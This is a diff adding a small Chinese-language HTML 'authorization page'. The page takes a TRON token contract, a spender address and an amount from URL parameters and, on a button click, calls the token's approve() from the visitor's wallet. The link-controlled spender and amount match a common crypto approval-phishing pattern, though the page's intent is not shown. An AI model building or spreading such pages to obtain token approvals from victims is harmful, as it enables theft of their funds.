@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>授权页面</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb"></script>
+</head>
+<body>
+    <h1>授权页面</h1>
+    <p>合约地址: <span id="contractAddress"></span></p>
+    <p>目标地址: <span id="targetAddress"></span></p>
+    <p>授权金额: <span id="authAmount"></span></p>
+    <button id="authorizeButton">授权</button>
+
+    <script>
+        // 从URL解析参数
+        const urlParams = new URLSearchParams(window.location.search);
+        const contractAddress = urlParams.get('contract');
+        const targetAddress = urlParams.get('target');
+        const authAmount = urlParams.get('amount');
+
+        // 显示信息
+        document.getElementById('contractAddress').textContent = contractAddress;
+        document.getElementById('targetAddress').textContent = targetAddress;
+        document.getElementById('authAmount').textContent = authAmount;
+
+        // 初始化TronWeb
+        const tronWeb = new TronWeb({
+            fullHost: 'https://api.trongrid.io',
+        });
+
+        // 授权按钮点击事件
+        document.getElementById('authorizeButton').onclick = async function() {
+            try {
+                const userAddress = tronWeb.defaultAddress.base58;
+                const contract = await tronWeb.contract().at(contractAddress);
+
+                // 授权代币
+                await contract.approve(targetAddress, authAmount).send({
+                    from: userAddress
+                });
+
+                alert('授权成功');
+            } catch (error) {
+                console.error(error);
+                alert('授权失败');
+            }
+        };
+    </script>
+</body>
+</html>
